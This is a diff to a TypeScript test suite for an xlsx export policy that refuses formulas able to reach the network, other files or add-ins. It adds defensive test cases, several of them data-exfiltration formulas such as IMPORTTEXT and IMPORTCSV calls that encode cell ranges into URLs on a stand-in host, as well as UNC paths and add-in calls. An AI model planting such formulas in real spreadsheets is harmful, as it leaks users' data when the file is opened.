@@ -119,6 +119,8 @@ describe('office formula policy — formulas stay inside the workbook', () => {
   // to), so a formula that can reach the network, another program or another
   // file would do so the moment someone opens the export. Excel, LibreOffice
   // and Google Sheets all recalculate an .xlsx, so each one's ways out count.
+  // Known ways out are refused by name; any other function that is not one of
+  // Excel's own is refused because the policy does not know it.
   const oneFormula = (formula: string): XlsxDescriptor => ({
     sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
   });
@@ -140,6 +142,23 @@ describe('office formula policy — formulas stay inside the workbook', () => {
     ['IMPORTHTML("https://example.invalid/","table",1)', 'a Google Sheets HTML fetch', /uses IMPORTHTML,/],
     ['IMPORTFEED("https://example.invalid/feed")', 'a Google Sheets feed fetch', /uses IMPORTFEED,/],
     ['IMPORTRANGE("https://example.invalid/d/x","S!A1")', 'another Google spreadsheet', /uses IMPORTRANGE,/],
+    // Local files, UNC paths and URLs read into the grid (Excel).
+    [
+      'IMPORTTEXT("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",TRUE,A2:F500)))',
+      'a text import carrying cell data',
+      /uses IMPORTTEXT,/,
+    ],
+    ['_xlfn.IMPORTTEXT("C:\\Data\\export.txt")', 'a local text file, with the future-function prefix', /uses IMPORTTEXT,/],
+    ['IMPORTCSV("https://example.invalid/c?q="&ENCODEURL(A2))', 'a CSV import carrying cell data', /uses IMPORTCSV,/],
+    ['_xlfn.IMPORTCSV("\\\\host\\share\\c.csv")', 'a CSV file on a UNC path', /uses IMPORTCSV,/],
+    ['MAP(A2:A9,IMPORTCSV)', 'an import function passed as a value', /uses IMPORTCSV,/],
+    // Vendor services and data connections.
+    ['STOCKHISTORY("MSFT",TODAY())', "Microsoft's stock data service", /uses STOCKHISTORY,/],
+    ['TRANSLATE(A1,"de","en")', "Microsoft's translation service", /uses TRANSLATE,/],
+    ['DETECTLANGUAGE(A1)', 'a language detection service', /uses DETECTLANGUAGE,/],
+    ['GOOGLEFINANCE("NASDAQ:GOOG")', "Google's finance service", /uses GOOGLEFINANCE,/],
+    ['GOOGLETRANSLATE(A1,"de","en")', "Google's translation service", /uses GOOGLETRANSLATE,/],
+    ['CUBEVALUE("Sales","[Measures].[Total]")', 'an OLAP query through a data connection', /uses CUBEVALUE,/],
     // Links.
     ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK,/],
     // COM servers and DLLs.
@@ -166,6 +185,16 @@ describe('office formula policy — formulas stay inside the workbook', () => {
     ['\\\\host\\share\\book.xlsx!Total', 'an unquoted UNC path', /another file by its path/],
     ['C:\\dir\\book.xlsx!Total', 'an unquoted local path', /another file by its path/],
     ["'https://example.invalid/book.xlsx'!Total", 'a quoted URL', /another file by its path/],
+    // Anything that is not one of Excel's own functions, whatever it does.
+    ['IMPORTJSON("https://example.invalid/")', 'a function the catalogue does not list', /calls IMPORTJSON,/],
+    ['SUMMEWENNS(A:A,B:B,C1)', 'a localised function name', /calls SUMMEWENNS,/],
+    ['ＳＵＭ(A1:A3)', 'a full-width look-alike of an allowed name', /calls ＳＵＭ,/],
+    ['EVALUATE("1+1")', 'an Excel 4 macro function', /calls EVALUATE,/],
+    ['_xll.FETCH("https://example.invalid/")', 'an XLL add-in function', /add-in or user-defined function/],
+    ['MAP(A2:A9,_xll.FETCH)', 'an add-in function passed as a value', /add-in or user-defined function/],
+    ['_xludf.FETCH(A1)', 'a user-defined function', /add-in or user-defined function/],
+    ['GROUPBY(A2:A9,B2:B9,_xleta.FETCH)', 'an unknown function passed as a value', /calls _xleta\.FETCH,/],
+    ['LET(f,LAMBDA(x,x*2),f(A1))', 'a call through a LET name', /calls f,/],
     // Fail closed.
     ['IF(A1="x', 'an unterminated string literal', /unterminated quote/],
   ];
@@ -181,24 +210,60 @@ describe('office formula policy — formulas stay inside the workbook', () => {
     });
   }
 
-  it('rejects a computed column template before any row is written', async () => {
-    const descriptor: XlsxDescriptor = {
-      sheets: [
-        {
-          name: 'S',
-          columns: [
-            { key: 'a', header: 'A' },
-            { key: 'link', header: 'Link', formula: 'HYPERLINK("https://example.invalid/?r="&A{row})' },
-          ],
-          rows: [{ a: 'x' }],
-        },
-      ],
-    };
-    await assert.rejects(renderXlsx(descriptor), (err: unknown) => {
-      assert.ok(err instanceof OfficeUnsafeFormulaError);
-      assert.equal(err.location, 'sheet "S", computed column "link"');
-      return true;
+  // A computed column is checked once, as a template, before any row is
+  // written. `{row}` becomes each row's number, so the template must not let
+  // those digits turn into part of a function name.
+  const computedColumn = (formula: string): XlsxDescriptor => ({
+    sheets: [
+      {
+        name: 'S',
+        columns: [
+          { key: 'a', header: 'A' },
+          { key: 'calc', header: 'Calc', formula },
+        ],
+        rows: [{ a: 'x' }, { a: 'y' }],
+      },
+    ],
+  });
+
+  const rejectedTemplates: ReadonlyArray<readonly [template: string, why: string, reason: RegExp]> = [
+    ['HYPERLINK("https://example.invalid/?r="&A{row})', 'a link built from each row', /uses HYPERLINK,/],
+    [
+      'IMPORTCSV("https://example.invalid/c?q="&ENCODEURL(A{row}))',
+      'a CSV import carrying each row',
+      /uses IMPORTCSV,/,
+    ],
+    [
+      '_xlfn.IMPORTTEXT("https://example.invalid/?r="&A{row})',
+      'a text import with the future-function prefix',
+      /uses IMPORTTEXT,/,
+    ],
+    ['LOG{row}(100)', 'a row number that completes a function name', /\{row\} placeholder/],
+    ['FETCH{row}(A{row})', 'a row number glued to a longer name', /\{row\} placeholder/],
+  ];
+
+  for (const [template, why, reason] of rejectedTemplates) {
+    it(`rejects a computed column with ${why} before any row is written`, async () => {
+      await assert.rejects(renderXlsx(computedColumn(template)), (err: unknown) => {
+        assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${template}`);
+        assert.equal(err.location, 'sheet "S", computed column "calc"');
+        assert.match(err.reason, reason);
+        return true;
+      });
     });
+  }
+
+  it('keeps computed columns whose {row} completes a cell reference', async () => {
+    const allowed = [
+      'A{row}*2',
+      'SUM($A$2:$A${row})',
+      'IF(A{row}="x",1,0)',
+      'YEAR(A{row})&"-"&TEXT(MONTH(A{row}),"00")',
+    ];
+    for (const template of allowed) {
+      const result = await renderXlsx(computedColumn(template));
+      assert.equal(result.rowsWritten, 2, template);
+    }
   });
 
   it('keeps formulas that only compute over this workbook', async () => {
@@ -212,6 +277,12 @@ describe('office formula policy — formulas stay inside the workbook', () => {
       'IF(A1="WEBSERVICE(x)|[y]\\\\z","a","b")', // text inside a string literal
       'IFERROR(A2/B2,0)', // `/` outside quotes divides; it is not a path
       'YEAR(A2)&"-"&TEXT(MONTH(A2),"00")',
+      'sum(a2:a9)', // function names are case-insensitive
+      '_xlfn.XLOOKUP(A2,Data!A:A,Data!B:B)', // the future-function prefix
+      '_xlfn._xlws.SORT(A2:A9)', // the worksheet-only prefix
+      'GROUPBY(A2:A9,B2:B9,_xleta.SUM)', // a built-in passed as a value
+      'LET(x,SUM(A2:A9),x*2)', // a LET name used as a value, not called
+      'LOG10(A2)+ATAN2(1,1)*1E3', // digits inside names and exponents
     ];
     for (const formula of allowed) {
       const result = await renderXlsx(oneFormula(formula));
